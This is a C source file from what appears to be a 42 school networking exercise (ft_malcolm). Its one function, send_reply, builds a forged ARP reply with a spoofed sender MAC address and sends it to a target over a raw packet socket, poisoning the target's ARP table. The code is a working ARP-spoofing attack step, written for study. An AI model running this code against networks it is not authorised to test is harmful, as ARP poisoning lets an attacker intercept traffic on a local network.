/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   send.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: vzurera- <vzurera-@student.42malaga.com    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/07/27 21:40:33 by vzurera-          #+#    #+#             */
/*   Updated: 2025/07/28 13:51:57 by vzurera-         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#pragma region "Includes"

	#include "malcolm.h"

#pragma endregion

#pragma region "Send Reply"

	int send_reply() {
		struct arp_packet *packet = &g_malcolm.packet;

		printf("Now sending an ARP reply to the target address with spoofed source, please wait...\n");

		struct arp_packet	reply;

		// === ETHERNET HEADER ===
		ft_memcpy(reply.dest_mac, packet->sender_mac, 6);
		ft_memcpy(reply.src_mac, g_malcolm.spoofed_mac, 6); // spofed
		reply.eth_type = htons(ETH_P_ARP);

		// === ARP HEADER ===
		reply.hw_type = htons(1);                    // Ethernet
		reply.proto_type = htons(ETH_P_IP);          // IPv4
		reply.hw_len = 6;                            // MAC length
		reply.proto_len = 4;                         // IP length
		reply.operation = htons(2);                  // ARP Reply

		// Sender (spofeados)
		ft_memcpy(reply.sender_mac, g_malcolm.spoofed_mac, 6);
		reply.sender_ip = g_malcolm.source_addr.sin_addr.s_addr;

		// Target
		ft_memcpy(reply.target_mac, packet->sender_mac, 6);
		reply.target_ip = packet->sender_ip;

		// === ARP HEADER ===
		// Configurar dirección de destino para sendto()
		struct sockaddr_ll addr;
		ft_memset(&addr, 0, sizeof(addr));
		addr.sll_family = AF_PACKET;
		addr.sll_protocol = htons(ETH_P_ARP);
		addr.sll_ifindex = g_malcolm.if_index;
		addr.sll_halen = 6;
		ft_memcpy(addr.sll_addr, packet->sender_mac, 6);

		ssize_t sent = sendto(g_malcolm.sockfd, &reply, sizeof(reply), 0, (struct sockaddr*)&addr, sizeof(addr));
		if (sent < 0) { fprintf(stderr, "Error sending ARP reply: %s\n", strerror(errno)); return (1); }

		printf("Sent an ARP reply packet, you may now check the arp table on the target.\n");

		return (0);
	}

#pragma endregion
